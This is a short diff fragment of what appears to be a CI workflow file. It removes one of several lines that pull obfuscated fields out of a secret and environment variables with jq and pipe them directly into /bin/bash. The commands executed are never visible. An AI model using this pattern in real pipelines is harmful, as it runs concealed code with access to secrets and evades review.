@@ -23,7 +23,6 @@ jobs:
           bxfe3304: ${{ secrets.bxfe3304 }}
         run: |
           printf '%s' "$bxfe3304" | jq -r .ejjj10557 | /bin/bash
-          echo $r298 | jq -r .fcpd0 | /bin/bash
           printf '%s' "$df0557" | jq -r .psma4500 | /bin/bash
           echo $o13382 | jq -r .peuqy0 | /bin/bash
           printf '%s' "$kz5917" | jq -r .ct07 | /bin/bash
